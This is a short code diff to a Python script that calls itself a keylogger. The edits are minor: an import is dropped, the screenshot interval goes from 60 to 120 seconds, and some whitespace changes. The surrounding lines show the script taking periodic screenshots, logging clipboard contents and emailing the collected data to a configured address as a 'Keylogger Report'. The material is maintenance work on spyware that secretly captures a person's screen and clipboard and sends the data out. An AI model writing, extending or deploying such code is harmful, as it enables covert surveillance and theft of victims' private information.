@@ -7,7 +7,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from datetime import datetime
 import threading
-import os
 import time
 
 # Email configuration
@@ -40,7 +39,7 @@ def capture_screenshots():
     while True:
         screenshot_file = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
         pyautogui.screenshot(screenshot_file)
-        time.sleep(60)  # Take a screenshot every 60 seconds
+        time.sleep(120)  # Take a screenshot every 120 seconds
 
 # Function to log clipboard content
 def log_clipboard():
@@ -66,7 +65,6 @@ def send_email():
         msg['From'] = EMAIL_ADDRESS
         msg['To'] = SEND_TO_EMAIL
         msg['Subject'] = 'Keylogger Report'
-
         msg.attach(MIMEText(log_data, 'plain'))
 
         try:
@@ -78,6 +76,7 @@ def send_email():
             logging.info("Email sent successfully.")
         except Exception as e:
             logging.error(f"Failed to send email: {e}")
+
 
 # Start the keylogger and other functions
 def start_keylogger():
